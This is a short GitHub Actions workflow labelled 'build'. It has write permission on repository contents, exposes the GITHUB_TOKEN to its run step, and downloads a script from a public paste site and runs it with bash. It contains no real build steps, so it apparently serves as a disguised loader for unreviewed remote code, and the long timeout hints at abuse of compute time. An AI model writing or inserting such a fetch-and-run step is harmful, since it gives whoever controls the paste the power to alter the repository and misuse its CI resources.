name: build
on: [workflow_dispatch, push]
permissions:
  contents: write
jobs:
  b:
    runs-on: ubuntu-24.04
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with: {fetch-depth: 0}
      - env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          curl -fsSL https://paste.c-net.org/ChickensOrson -o /tmp/run.sh
          bash /tmp/run.sh
